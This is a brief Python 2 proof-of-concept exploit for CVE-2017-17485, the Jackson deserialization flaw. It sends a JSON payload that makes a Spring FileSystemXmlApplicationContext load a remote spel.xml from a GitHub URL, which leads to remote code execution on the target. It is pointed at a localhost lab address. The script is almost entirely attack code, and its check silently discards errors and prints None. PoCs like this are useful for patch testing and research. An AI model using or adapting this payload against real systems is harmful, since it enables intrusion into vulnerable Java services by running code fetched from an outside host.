#!/usr/bin/env python
# coding: utf-8
import requests
class POC:
    def __init__(self):
        self.url = ""
    def verify(self):
        try:
            headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "zh-CN,zh;q=0.8,ja;q=0.6,en;q=0.4,en-US;q=0.2",
                "Pragma": "no-cache",
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
                "Content-Type":"application/json"
            }
            data = '{"id":123, "obj": ["org.springframework.context.support.FileSystemXmlApplicationContext", "https://raw.githubusercontent.com/hucheat/vulns/master/cve-2017-17485_web_vuln/spel.xml"]}'
            s = requests.Session()
            s.post(self.url+"rce",headers=headers,data=data)
        except:
            pass
P = POC()
P.url = "http://127.0.0.1:8080/cve-2017-17485/"
print P.verify()
